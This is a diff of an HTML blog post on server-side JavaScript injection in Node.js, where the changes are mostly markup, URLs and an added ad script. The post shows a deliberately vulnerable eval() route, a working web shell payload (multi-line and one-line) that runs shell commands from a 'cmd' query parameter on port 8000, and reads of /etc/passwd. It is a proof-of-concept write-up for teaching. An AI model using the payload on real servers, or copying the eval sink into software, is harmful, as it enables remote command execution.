@@ -10,8 +10,16 @@
   <meta name="description" content="I’ve recently become interested in real world examples of vulnerabilities in Node.js applications, which allow Server Side Javascript Injection. One advisory...">
 
   <link rel="stylesheet" href="/css/main.css">
-  <link rel="canonical" href="http://s1gnalcha0s.github.io/node/2015/01/31/SSJS-webshell-injection.html">
-  <link rel="alternate" type="application/rss+xml" title="Signal Chaos" href="http://s1gnalcha0s.github.io/feed.xml" />
+  <link rel="canonical" href="http://localhost:4000/node/2015/01/31/SSJS-webshell-injection.html">
+  <link rel="alternate" type="application/rss+xml" title="Signal Chaos" href="http://localhost:4000/feed.xml" />
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>
+    (adsbygoogle = window.adsbygoogle || []).push({
+      google_ad_client: "ca-pub-2306194403955793",
+      enable_page_level_ads: true
+    });
+  </script>
 </head>
 
 
@@ -66,7 +74,7 @@
   </header>
 
   <article class="post-content">
-    <p>I’ve recently become interested in real world examples of vulnerabilities in Node.js applications, which allow <code>Server Side Javascript Injection</code>. One advisory I came across was <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7205">CVE-2014-7205</a> discovered by Jarda Kotěšovec in a <a href="https://github.com/hapijs/bassmaster/commit/b751602d8cb7194ee62a61e085069679525138c4">Basmaster plugin</a> which allows arbitrary Javascript injection.</p>
+    <p>I’ve recently become interested in real world examples of vulnerabilities in Node.js applications, which allow <code class="highlighter-rouge">Server Side Javascript Injection</code>. One advisory I came across was <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7205">CVE-2014-7205</a> discovered by Jarda Kotěšovec in a <a href="https://github.com/hapijs/bassmaster/commit/b751602d8cb7194ee62a61e085069679525138c4">Basmaster plugin</a> which allows arbitrary Javascript injection.</p>
 
 <p>I decided to mock up a simple example of user input passed to an eval() execution sink, to demonstrate an injection of a simple web shell into the server. This web shell will only exist within the current node.js process, and will not be written to disk.</p>
 
@@ -75,54 +83,54 @@
 
 <p>Vulnerable code (user input passed to an eval execution sink):</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/demo1&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
-  <span class="kd">var</span> <span class="nx">year</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="s2">&quot;year = (&quot;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">year</span> <span class="o">+</span> <span class="s2">&quot;)&quot;</span><span class="p">);</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/demo1'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">year</span> <span class="o">=</span> <span class="kr">eval</span><span class="p">(</span><span class="s2">"year = ("</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">year</span> <span class="o">+</span> <span class="s2">")"</span><span class="p">);</span>
   <span class="kd">var</span> <span class="nx">date</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
 
   <span class="kd">var</span> <span class="nx">futureAge</span> <span class="o">=</span> <span class="mi">2050</span> <span class="o">-</span> <span class="nx">year</span><span class="p">;</span>
 
-  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;demo1&#39;</span><span class="p">,</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">'demo1'</span><span class="p">,</span>
     <span class="p">{</span>
-      <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;Future Age&#39;</span><span class="p">,</span>
-      <span class="nx">output</span><span class="o">:</span> <span class="nx">futureAge</span>
+      <span class="na">title</span><span class="p">:</span> <span class="s1">'Future Age'</span><span class="p">,</span>
+      <span class="na">output</span><span class="p">:</span> <span class="nx">futureAge</span>
     <span class="p">});</span>
-<span class="p">});</span></code></pre></div>
+<span class="p">});</span></code></pre></figure>
 
 <p>In this example res.write(‘SSJS Injection’) is injected, and the server will return that string in the page response:
 <img src="/assets/SSJS_ws2.png" alt="Demo app" /></p>
 
 <p>So we can perform arbitrary SSJS injection on this location. What about injecting a web shell that will start up after 5 seconds, listening on TCP/8000?</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-    <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="s1">'http'</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span>
-            <span class="s2">&quot;Content-Type&quot;</span><span class="o">:</span> <span class="s2">&quot;text/plain&quot;</span>
+            <span class="s2">"Content-Type"</span><span class="p">:</span> <span class="s2">"text/plain"</span>
         <span class="p">});</span>
-        <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">st</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">'url'</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">st</span><span class="p">)</span> <span class="p">{</span>
             <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
         <span class="p">});</span>
     <span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span>
-<span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></div>
+<span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></figure>
 
 <p>One line web shell:</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span> <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="o">:</span> <span class="s2">&quot;text/plain&quot;</span><span class="p">});</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">st</span><span class="p">)</span> <span class="p">{</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">s</span><span class="p">);});</span> <span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span> <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'http'</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span> <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="s2">"Content-Type"</span><span class="p">:</span> <span class="s2">"text/plain"</span><span class="p">});</span><span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">'url'</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">st</span><span class="p">)</span> <span class="p">{</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">s</span><span class="p">);});</span> <span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span> <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></figure>
 
-<p>Because we are inserting code which will be eval’d by the application, the web shell will not be written to disk, and execution will be performed from the existing node process. </p>
+<p>Because we are inserting code which will be eval’d by the application, the web shell will not be written to disk, and execution will be performed from the existing node process.</p>
 
 <p>Injection of the web shell (application continues to respond normally):
 <img src="/assets/SSJS_ws3.png" alt="Demo app" /></p>
 
-<p>Execution of <code>cat /etc/passwd</code> using the web shell:
+<p>Execution of <code class="highlighter-rouge">cat /etc/passwd</code> using the web shell:
 <img src="/assets/SSJS_ws4.png" alt="Demo app" /></p>
 
-<p>Execution of <code>ls -la /etc</code>:
+<p>Execution of <code class="highlighter-rouge">ls -la /etc</code>:
 <img src="/assets/SSJS_ws5.png" alt="Demo app" /></p>
 
 <p>This is a really simple example of an application with a SSJS injection vulnerability. Another thing to note is that tools to identify web application vulnerabilities may not have support to detect this vulnerability. At the time of this writing, Burp Suite v1.6.10 did not identify a SSJS injection vulnerability in the demo application.</p>
 
 <ul>
-  <li><code>s1gnalCha0s</code></li>
+  <li><a href="https://craigarendt.com">s1gnalCha0s</a></li>
 </ul>
 
   </article>
@@ -168,7 +176,7 @@
 
           
           <li>
-            <a href="https://twitter.com/craig_arendt">
+            <a href="https://twitter.com/signalchaos">
               <span class="icon  icon--twitter">
                 <svg viewBox="0 0 16 16">
                   <path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809
@@ -176,7 +184,7 @@
                 </svg>
               </span>
 
-              <span class="username">craig_arendt</span>
+              <span class="username">signalchaos</span>
             </a>
           </li>
           
